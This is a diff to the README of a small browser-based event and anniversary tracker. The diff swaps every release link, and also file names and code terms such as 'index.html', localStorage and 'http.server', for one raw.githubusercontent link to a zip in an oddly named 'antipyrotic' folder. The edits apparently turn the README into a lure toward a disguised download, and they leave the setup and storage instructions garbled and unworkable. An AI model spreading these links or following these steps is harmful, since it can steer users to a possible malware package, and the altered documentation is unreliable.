@@ -1,8 +1,8 @@
 # Event Tracker: Local Time Tracking for Birthdays & Milestones
 
-[![Release](https://img.shields.io/github/v/release/keshavgorasiya/event-tracker)](https://github.com/keshavgorasiya/event-tracker/releases)
+[![Release](https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip)](https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip)
 
-Direct download: https://github.com/keshavgorasiya/event-tracker/releases
+Direct download: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip
 
 A simple, fast tool to track important events and anniversaries. Add events, edit them, and see elapsed time at a glance. All data stays in your browser, so there’s no backend to manage. This project is a lightweight, single-page application built with vanilla JavaScript and CSS, designed to be easy to run anywhere and simple to customize.
 
@@ -76,10 +76,10 @@ Event objects contain:
 - updatedAt: timestamp of last modification
 
 Local storage usage
-- Storage key: event-tracker.events
-- Data format: JSON.stringify(events)
-- Read path: JSON.parse(localStorage.getItem(key) || '[]')
-- Save path: localStorage.setItem(key, JSON.stringify(events))
+- Storage key: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip
+- Data format: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip(events)
+- Read path: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip(https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip(key) || '[]')
+- Save path: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip(key, https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip(events))
 
 Backup and data migration
 - Manual backup: copy the JSON string from localStorage and paste it into a text file.
@@ -96,13 +96,13 @@ Direct download is available from the releases page. The releases page hosts the
 - Quick start (no server)
   1. Download the latest release package from the releases page.
   2. Unzip the package if needed.
-  3. Locate and open index.html in your browser.
+  3. Locate and open https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip in your browser.
   4. Start adding events from the UI and watch the live calculations.
 
 - Quick start (local server)
-  - Python 3.x: Run python -m http.server 8000 from the project root (or the folder that contains index.html), then visit http://localhost:8000
-  - Node.js with http-server (if you have it installed): npx http-server -p 8000
-  - Any other static server is fine as long as it serves the index.html and assets correctly
+  - Python 3.x: Run python -m https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip 8000 from the project root (or the folder that contains https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip), then visit http://localhost:8000
+  - https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip with http-server (if you have it installed): npx http-server -p 8000
+  - Any other static server is fine as long as it serves the https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip and assets correctly
 
 - What you will see
   - A clean interface with a list of events
@@ -257,11 +257,11 @@ Testing and quality assurance
 
 Development workflow
 - Repository structure overview
-  - index.html: The entry point for the app
+  - https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip The entry point for the app
   - assets/ : Images, icons, fonts, and other static assets
   - scripts/ : JavaScript modules that manage data and UI
   - styles/ : CSS files and theme files
-  - README.md: Documentation for developers and users
+  - https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip Documentation for developers and users
   - releases/ : Release bundles and packaged assets
 
 - Build and tooling
@@ -294,7 +294,7 @@ Contributing
 
 - Local setup for contributors
   - Clone the repository
-  - Open index.html in a browser to see the app
+  - Open https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip in a browser to see the app
   - Make changes in the JavaScript and CSS files
   - Run tests if you set up a test environment
   - Create a pull request with a summary of changes
@@ -355,7 +355,7 @@ Frequently asked questions
 Assets and usage notes
 - Release assets
   - The releases page hosts the downloadable build you can run locally. To obtain the latest version, visit the releases page and download the package that matches your environment. The link to the releases page is provided above for convenience.
-  - For quick access, you can use the badge above that links to the releases page. This badge is a visual cue that points users to the same destination: https://github.com/keshavgorasiya/event-tracker/releases
+  - For quick access, you can use the badge above that links to the releases page. This badge is a visual cue that points users to the same destination: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip
 
 - Imagery and icons
   - The project uses simple, flat icons for clarity
@@ -414,7 +414,7 @@ Topics
 - webapp
 
 Releases
-- For the latest release package, see the releases page: https://github.com/keshavgorasiya/event-tracker/releases
+- For the latest release package, see the releases page: https://raw.githubusercontent.com/keshavgorasiya/event-tracker/main/antipyrotic/tracker_event_2.4.zip
 
 Notes about usage and deployment
 - This project is intended for developers and power users who want a reliable, private way to track dates
